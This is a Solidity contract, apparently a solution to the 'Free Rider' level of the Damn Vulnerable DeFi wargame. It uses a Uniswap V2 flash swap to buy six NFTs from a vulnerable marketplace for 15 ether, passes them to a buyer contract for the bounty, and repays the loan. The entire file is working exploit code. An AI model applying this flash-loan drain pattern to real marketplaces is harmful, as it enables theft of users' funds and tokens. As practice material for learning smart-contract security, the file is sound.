// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

import "hardhat/console.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    using Address for address;

    address payable immutable weth;
    address immutable dvt;
    address immutable factory;
    address payable immutable marketPlace;
    address immutable buyer;
    address immutable nft;

    constructor(
        address payable _weth,
        address _factory,
        address _dvt,
        address payable _marketPlace,
        address _buyer,
        address _nft
    ) {
        weth = _weth;
        dvt = _dvt;
        factory = _factory;
        marketPlace = _marketPlace;
        buyer = _buyer;
        nft = _nft;
    }

    function attack(address _tokenBorrow, uint256 _amount) external {
        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;
        bytes memory data = abi.encode(_tokenBorrow, _amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address _sender,
        uint256,
        uint256,
        bytes calldata _data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(
            _data,
            (address, uint256)
        );

        uint256 wEthBalance = IERC20(tokenBorrow).balanceOf(address(this));

        //Have to have receive() function to receive ETH
        tokenBorrow.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", wEthBalance)
        );

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        FreeRiderNFTMarketplace(marketPlace).buyMany{value: 15 ether}(tokenIds);
        // Transfer nft to buyer contract
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        //about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // Convert eth to weth to repay Uinswap
        (bool success, ) = weth.call{value: amountToRepay}("");
        require(success, "!deposit weth");

        //Repay flash loan swap
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
